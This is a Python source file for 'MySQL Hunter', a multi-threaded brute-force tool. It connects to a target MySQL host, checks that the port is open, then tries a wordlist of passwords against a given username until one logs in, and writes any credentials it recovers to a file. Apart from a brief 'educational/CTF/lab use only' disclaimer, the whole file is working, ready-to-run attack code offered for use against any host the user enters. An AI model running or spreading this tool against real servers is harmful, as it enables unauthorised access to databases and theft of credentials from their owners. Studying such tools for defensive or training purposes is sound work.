#!/usr/bin/env python3
"""
██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝

MySQL Hunter v1.0
A fast, multi-threaded MySQL brute-force tool

Features:
- Interactive mode (no arguments) OR command-line mode
- Enhanced progress bar with live stats
- Color-coded output
- Error tracking and summary

For educational/CTF/lab use only
Author: Sachin
"""

import mysql.connector
from mysql.connector import Error
import argparse
import sys
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock, Event
import time

# Colors for terminal output
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

# Tool info
TOOL_NAME = "MySQL Hunter"
VERSION = "1.0"

# Thread-safe variables
found_event = Event()
print_lock = Lock()
stats = {
    'attempted': 0,
    'success': 0,
    'errors': {},
    'current_password': ''
}
stats_lock = Lock()

def clear_line():
    """Clear current line in terminal"""
    sys.stdout.write('\r' + ' ' * get_terminal_width() + '\r')
    sys.stdout.flush()

def get_terminal_width():
    """Get terminal width"""
    try:
        return os.get_terminal_size().columns
    except:
        return 80

def banner():
    print(f"""
{Colors.RED}{Colors.BOLD}
   ███╗   ███╗██╗   ██╗███████╗ ██████╗ ██╗     
   ████╗ ████║╚██╗ ██╔╝██╔════╝██╔═══██╗██║     
   ██╔████╔██║ ╚████╔╝ ███████╗██║   ██║██║     
   ██║╚██╔╝██║  ╚██╔╝  ╚════██║██║▄▄ ██║██║     
   ██║ ╚═╝ ██║   ██║   ███████║╚██████╔╝███████╗
   ╚═╝     ╚═╝   ╚═╝   ╚══════╝ ╚══▀▀═╝ ╚══════╝
{Colors.CYAN}{Colors.BOLD}
   ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
   ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
   ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
   ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
   ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
{Colors.RESET}
{Colors.YELLOW}   ─────────────────────────────────────────────────────{Colors.RESET}
{Colors.WHITE}       Fast Multi-Threaded MySQL Brute-Force Tool{Colors.RESET}
{Colors.DIM}              For Educational/Lab Use Only{Colors.RESET}
{Colors.DIM}                     Version {VERSION}{Colors.RESET}
{Colors.YELLOW}   ─────────────────────────────────────────────────────{Colors.RESET}
""")

def progress_bar(current, total, width=35):
    """Create an animated progress bar"""
    if total == 0:
        return "[" + "?" * width + "]"
    
    percent = current / total
    filled = int(width * percent)
    
    # Gradient effect: ████▓▓░░░
    bar = '█' * filled
    if filled < width:
        bar += '▓'
        bar += '░' * (width - filled - 1)
    
    return f"[{bar}]"

def format_time(seconds):
    """Format seconds into human readable time"""
    if seconds < 60:
        return f"{seconds:.0f}s"
    elif seconds < 3600:
        mins = seconds // 60
        secs = seconds % 60
        return f"{mins:.0f}m {secs:.0f}s"
    else:
        hours = seconds // 3600
        mins = (seconds % 3600) // 60
        return f"{hours:.0f}h {mins:.0f}m"

def format_number(num):
    """Format large numbers with commas"""
    return f"{num:,}"

def try_login(host, port, username, password, database=""):
    """Attempt to login with given credentials"""
    if found_event.is_set():
        return (password, "SKIPPED", None)
    
    # Update current password being tried
    with stats_lock:
        stats['current_password'] = password
    
    try:
        connection = mysql.connector.connect(
            host=host,
            port=port,
            user=username,
            password=password,
            database=database if database else None,
            connection_timeout=10
        )
        if connection.is_connected():
            connection.close()
            return (password, "SUCCESS", None)
    except Error as e:
        return (password, "FAILED", e.errno)
    except Exception as e:
        return (password, "ERROR", str(e))
    
    return (password, "FAILED", None)

def display_progress(attempted, total, start_time, current_pwd, found=False):
    """Display beautiful progress bar with stats"""
    elapsed = time.time() - start_time
    rate = attempted / elapsed if elapsed > 0 else 0
    remaining = total - attempted
    eta = remaining / rate if rate > 0 else 0
    percent = (attempted / total) * 100 if total > 0 else 0
    
    # Build progress display
    bar = progress_bar(attempted, total, 30)
    
    # Truncate password for display
    pwd_display = current_pwd[:18] + ".." if len(current_pwd) > 20 else current_pwd
    
    # Create the status line
    line1 = f"{Colors.CYAN}{bar} {percent:>5.1f}%{Colors.RESET}"
    line2 = f"{Colors.WHITE}{format_number(attempted)}{Colors.DIM}/{format_number(total)}{Colors.RESET}"
    line3 = f"{Colors.GREEN}⚡{rate:>6.1f}/s{Colors.RESET}"
    line4 = f"{Colors.YELLOW}⏱ ETA: {format_time(eta)}{Colors.RESET}"
    line5 = f"{Colors.MAGENTA}→ {pwd_display:<20}{Colors.RESET}"
    
    # Single line output
    output = f"\r  {line1} {line2} {line3} {line4} {line5}"
    
    # Pad to clear previous content
    terminal_width = get_terminal_width()
    output = output[:terminal_width-1].ljust(terminal_width-1)
    
    sys.stdout.write(output)
    sys.stdout.flush()

def get_user_input():
    """Interactive mode - get input from user"""
    print(f"{Colors.YELLOW}{'─' * 55}{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}  🎯 {TOOL_NAME} - Interactive Mode{Colors.RESET}")
    print(f"{Colors.YELLOW}{'─' * 55}{Colors.RESET}")
    print()
    
    # Host
    while True:
        host = input(f"  {Colors.WHITE}[?] Target Host IP {Colors.DIM}(e.g., 192.168.1.100){Colors.RESET}: ").strip()
        if host:
            break
        print(f"  {Colors.RED}[!] Host is required{Colors.RESET}")
    
    # Port
    port_input = input(f"  {Colors.WHITE}[?] MySQL Port {Colors.DIM}(default: 3306){Colors.RESET}: ").strip()
    port = int(port_input) if port_input else 3306
    
    # Username
    while True:
        username = input(f"  {Colors.WHITE}[?] Username to attack {Colors.DIM}(e.g., root){Colors.RESET}: ").strip()
        if username:
            break
        print(f"  {Colors.RED}[!] Username is required{Colors.RESET}")
    
    # Wordlist
    while True:
        wordlist = input(f"  {Colors.WHITE}[?] Wordlist path {Colors.DIM}(e.g., wordlist.txt){Colors.RESET}: ").strip()
        if wordlist and os.path.exists(wordlist):
            break
        elif wordlist:
            print(f"  {Colors.RED}[!] File not found: {wordlist}{Colors.RESET}")
        else:
            print(f"  {Colors.RED}[!] Wordlist path is required{Colors.RESET}")
    
    # Threads
    threads_input = input(f"  {Colors.WHITE}[?] Number of threads {Colors.DIM}(default: 10){Colors.RESET}: ").strip()
    threads = int(threads_input) if threads_input else 10
    
    # Database (optional)
    database = input(f"  {Colors.WHITE}[?] Database name {Colors.DIM}(optional, press Enter to skip){Colors.RESET}: ").strip()
    
    # Verbose
    verbose_input = input(f"  {Colors.WHITE}[?] Verbose mode? {Colors.DIM}(y/N){Colors.RESET}: ").strip().lower()
    verbose = verbose_input in ['y', 'yes']
    
    print()
    return host, port, username, wordlist, threads, database, verbose

def test_connection(host, port):
    """Test if target port is open"""
    import socket
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except Exception:
        return False

def test_mysql_response(host, port, username, database=""):
    """Test MySQL response with wrong password"""
    result = try_login(host, port, username, "WRONG_PASSWORD_TEST_12345", database)
    return result

def bruteforce(host, port, username, wordlist_path, threads=10, database="", verbose=False):
    """Main brute-force function with enhanced progress"""
    
    print(f"{Colors.YELLOW}{'─' * 55}{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}  🎯 Target Configuration{Colors.RESET}")
    print(f"{Colors.YELLOW}{'─' * 55}{Colors.RESET}")
    print(f"  {Colors.WHITE}Host:{Colors.RESET}     {Colors.GREEN}{host}:{port}{Colors.RESET}")
    print(f"  {Colors.WHITE}Username:{Colors.RESET} {Colors.GREEN}{username}{Colors.RESET}")
    print(f"  {Colors.WHITE}Database:{Colors.RESET} {Colors.GREEN}{database if database else 'Any'}{Colors.RESET}")
    print(f"  {Colors.WHITE}Wordlist:{Colors.RESET} {Colors.GREEN}{wordlist_path}{Colors.RESET}")
    print(f"  {Colors.WHITE}Threads:{Colors.RESET}  {Colors.GREEN}{threads}{Colors.RESET}")
    print(f"  {Colors.WHITE}Verbose:{Colors.RESET}  {Colors.GREEN}{verbose}{Colors.RESET}")
    print()
    
    # Test port connectivity
    print(f"  {Colors.YELLOW}[*] Testing connection...{Colors.RESET}")
    if not test_connection(host, port):
        print(f"  {Colors.RED}[✗] Cannot connect to {host}:{port}{Colors.RESET}")
        print(f"  {Colors.RED}    Check: MySQL running? Firewall? IP correct?{Colors.RESET}")
        return None
    print(f"  {Colors.GREEN}[✓] Port {port} is open{Colors.RESET}")
    
    # Test MySQL response
    print(f"  {Colors.YELLOW}[*] Testing MySQL response...{Colors.RESET}")
    test_result = test_mysql_response(host, port, username, database)
    
    if test_result[1] == "ERROR":
        print(f"  {Colors.RED}[✗] Connection error: {test_result[2]}{Colors.RESET}")
        return None
    elif test_result[2] == 1045:
        print(f"  {Colors.GREEN}[✓] MySQL responding (Access Denied = expected){Colors.RESET}")
    elif test_result[2] == 1049:
        print(f"  {Colors.YELLOW}[!] Database '{database}' not found - continuing without database{Colors.RESET}")
        database = ""
    elif test_result[2] == 2003:
        print(f"  {Colors.RED}[✗] Can't connect to MySQL server{Colors.RESET}")
        return None
    elif test_result[2] == 2013:
        print(f"  {Colors.RED}[✗] Lost connection - server may be blocking{Colors.RESET}")
        return None
    else:
        print(f"  {Colors.GREEN}[✓] MySQL responded (Code: {test_result[2]}){Colors.RESET}")
    
    # Load wordlist
    print(f"  {Colors.YELLOW}[*] Loading wordlist...{Colors.RESET}")
    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"  {Colors.RED}[✗] Wordlist not found: {wordlist_path}{Colors.RESET}")
        return None
    
    total = len(passwords)
    print(f"  {Colors.GREEN}[✓] Loaded {format_number(total)} passwords{Colors.RESET}")
    
    # Show sample
    print(f"  {Colors.DIM}    Sample: {', '.join(passwords[:3])}...{Colors.RESET}")
    print()
    
    # Start attack
    print(f"{Colors.YELLOW}{'─' * 55}{Colors.RESET}")
    print(f"{Colors.RED}{Colors.BOLD}  🔥 HUNT STARTED 🔥{Colors.RESET}")
    print(f"{Colors.YELLOW}{'─' * 55}{Colors.RESET}")
    print()
    
    start_time = time.time()
    attempted = 0
    error_counts = {}
    result_password = None
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        future_to_pwd = {
            executor.submit(try_login, host, port, username, pwd, database): pwd 
            for pwd in passwords
        }
        
        for future in as_completed(future_to_pwd):
            if found_event.is_set():
                break
            
            attempted += 1
            result = future.result()
            pwd, status, error_code = result
            
            # Track errors
            if error_code:
                error_counts[error_code] = error_counts.get(error_code, 0) + 1
            
            # Update progress display
            if verbose or attempted % 50 == 0 or status == "SUCCESS":
                display_progress(attempted, total, start_time, pwd)
            
            # SUCCESS!
            if status == "SUCCESS":
                found_event.set()
                result_password = pwd
                elapsed = time.time() - start_time
                
                clear_line()
                print()
                print(f"{Colors.GREEN}{Colors.BOLD}")
                print(f"  ╔════════════════════════════════════════════════════════╗")
                print(f"  ║            🎯 TARGET CAPTURED! 🎯                      ║")
                print(f"  ╚════════════════════════════════════════════════════════╝{Colors.RESET}")
                print()
                print(f"  {Colors.WHITE}Host:{Colors.RESET}     {Colors.CYAN}{host}:{port}{Colors.RESET}")
                print(f"  {Colors.WHITE}Username:{Colors.RESET} {Colors.CYAN}{username}{Colors.RESET}")
                print(f"  {Colors.WHITE}Password:{Colors.RESET} {Colors.GREEN}{Colors.BOLD}{pwd}{Colors.RESET}")
                print()
                print(f"  {Colors.DIM}Time: {format_time(elapsed)} | Attempts: {format_number(attempted)} | Speed: {attempted/elapsed:.1f}/s{Colors.RESET}")
                print()
                
                # Save to file
                with open('hunter_results.txt', 'a') as f:
                    f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {host}:{port} - {username}:{pwd}\n")
                print(f"  {Colors.GREEN}[✓] Saved to hunter_results.txt{Colors.RESET}")
                print()
                
                return pwd
    
    # Not found
    elapsed = time.time() - start_time
    clear_line()
    print()
    print(f"{Colors.RED}{Colors.BOLD}")
    print(f"  ╔════════════════════════════════════════════════════════╗")
    print(f"  ║            ❌ TARGET ESCAPED ❌                        ║")
    print(f"  ╚════════════════════════════════════════════════════════╝{Colors.RESET}")
    print()
    print(f"  {Colors.WHITE}Attempted:{Colors.RESET} {Colors.YELLOW}{format_number(attempted)}{Colors.RESET} passwords")
    print(f"  {Colors.WHITE}Time:{Colors.RESET}      {Colors.YELLOW}{format_time(elapsed)}{Colors.RESET}")
    print(f"  {Colors.WHITE}Speed:{Colors.RESET}     {Colors.YELLOW}{attempted/elapsed:.1f} passwords/sec{Colors.RESET}")
    
    if error_counts:
        print()
        print(f"  {Colors.WHITE}Error Summary:{Colors.RESET}")
        for code, count in sorted(error_counts.items(), key=lambda x: x[1], reverse=True):
            if code == 1045:
                desc = "Access Denied (normal)"
            elif code == 2003:
                desc = "Can't Connect"
            elif code == 2013:
                desc = "Lost Connection"
            else:
                desc = "Unknown"
            print(f"    {Colors.DIM}Error {code} ({desc}): {format_number(count)}{Colors.RESET}")
    
    print()
    return None

def main():
    banner()
    
    # Check if arguments provided
    if len(sys.argv) > 1:
        # Command-line mode
        parser = argparse.ArgumentParser(
            description=f'{TOOL_NAME} v{VERSION} - Fast Multi-Threaded MySQL Brute-Force Tool',
            formatter_class=argparse.RawDescriptionHelpFormatter,
            epilog=f"""
{Colors.CYAN}Examples:{Colors.RESET}
  python %(prog)s -H 192.168.1.100 -u root -w wordlist.txt
  python %(prog)s -H 10.10.10.5 -P 3306 -u admin -w rockyou.txt -t 20
  python %(prog)s -H 127.0.0.1 -u root -w passwords.txt -d mydb -v

{Colors.YELLOW}Interactive Mode:{Colors.RESET}
  Run without arguments: python %(prog)s

{Colors.DIM}For educational and authorized penetration testing only.{Colors.RESET}
            """
        )
        parser.add_argument('-H', '--host', required=True, help='Target host IP')
        parser.add_argument('-P', '--port', type=int, default=3306, help='MySQL port (default: 3306)')
        parser.add_argument('-u', '--username', required=True, help='Username to brute-force')
        parser.add_argument('-w', '--wordlist', required=True, help='Path to password wordlist')
        parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
        parser.add_argument('-d', '--database', default='', help='Database name (optional)')
        parser.add_argument('-v', '--verbose', action='store_true', help='Show every attempt')
        parser.add_argument('--version', action='version', version=f'{TOOL_NAME} v{VERSION}')
        
        args = parser.parse_args()
        
        host = args.host
        port = args.port
        username = args.username
        wordlist = args.wordlist
        threads = args.threads
        database = args.database
        verbose = args.verbose
    else:
        # Interactive mode
        host, port, username, wordlist, threads, database, verbose = get_user_input()
    
    # Run the attack
    bruteforce(
        host=host,
        port=port,
        username=username,
        wordlist_path=wordlist,
        threads=threads,
        database=database,
        verbose=verbose
    )
    
    print(f"{Colors.YELLOW}{'─' * 55}{Colors.RESET}")
    print(f"{Colors.DIM}  Thank you for using {TOOL_NAME} v{VERSION}{Colors.RESET}")
    print(f"{Colors.DIM}  Happy Hunting! 🎯{Colors.RESET}")
    print(f"{Colors.YELLOW}{'─' * 55}{Colors.RESET}")
    print()

if __name__ == '__main__':
    main()
